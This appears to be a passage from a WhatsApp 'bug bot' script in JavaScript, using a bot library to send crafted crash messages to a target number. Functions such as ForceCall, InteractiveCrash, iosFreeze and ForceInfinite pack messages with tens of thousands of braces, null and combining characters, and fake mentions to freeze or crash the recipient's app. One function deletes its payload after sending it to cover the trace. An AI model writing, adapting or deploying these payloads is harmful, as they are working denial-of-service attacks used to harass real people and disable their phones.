              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://t.me/GyzenVtx",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 10; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) 
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: ""
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "" + "" + Math.floor(Math.random() * 99999), 
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "",
                body: "",
                thumbnailUrl: "https://example.com/Verse",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://t.me/GyzenVtx",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}                     
async function ForceCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "TheXtordcv",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "VINNXBOTXRULZ KILL YOU 🩸",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}
async function InteractiveCrash(target) {
  try {
    const Msg = await generateWAMessageFromContent(
      target,
      {
        message: {
          interactiveMessage: {
            text: "VinnXBot Offcial",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            name: "menu_option",
            paramsJson: "{{{".repeat(9999) + "\u0007\u0007".repeat(25555) + "".repeat(2555)
          },
          contextInfo: {
            stanzaId: "Laurine-BD32C2474B38",
            participant: target,
            annotations: [
              {
                polygonVertices: Array.from({ length: 10000 }, () => ({
                  x: Math.random() * 999999,
                  y: Math.random() * 999999
                })),
                newsletter: {
                  newsletterJid: "120363301416835342@newsletter",
                  newsletterName: "VinnXBot Official Kill You !!!",
                  contentType: "UPDATE",
                  accessibilityText: "\u0000".repeat(10000)
                }
              }
            ],
            quotedMessage: {
              buttonMessage: {
                text: "ꦾ".repeat(25555),
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c&mms3=true",
                  mimetype: "image/jpeg",
                  caption: "\u0000\u0000".repeat(20000),
                  fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=",
                  fileLength: 73247,
                  height: 736,
                  width: 736,
                  mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=",
                  fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=",
                  directPath: "/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c",
                  jpegThumbnail: null
                },
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }
    );

    await sock.relayMessage(target, Msg.message, {
      messageId: undefined
    });

    await delay(3000);

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: Msg.key?.id,
        participant: target
      }
    });

  } catch (err) {
    console.error('❌ Gagal menjalankan InteractiveCrash:', err);
  }
}
async function iosFreeze(target, Ptcp = true) {
   let anjayalokmwkakaakak = "palabapakkau" + "ြ".repeat(25000) + "@1".repeat(60000);
   await sock.relayMessage(target, {
         messages: {
            Exentedtextmesage: {
               message: {
                  documentMessage: {
                     url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                     mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                     fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                     fileLength: "999999999",
                     pageCount: 0x9184e729fff,
                     mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                     fileName: "NtahMengapa..",
                     fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                     directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                     mediaKeyTimestamp: "1715880173",
                     contactVcard: true
                  },
                  title: "",
                  hasMediaAttachment: true
               },
               body: {
                  text: anjayalokmwkakaakak
               },
               nativeFlowMessage: {},
               contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "0@newsletter"),
          }
         }
      }
   }, { participant: { jid: mentionedJid, target } }, { messageId: null });
}
async function ForceInfinite(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VINNRULZZGYZEN KILL YOU🩸",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝑽𝒐𝒓𝒕𝒖𝒏𝒊𝒙 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 𝑲𝒊𝒍𝒍 𝒀𝒐𝒖🪷",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "VINNRULZZGYZEN KILL YOU🩸",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}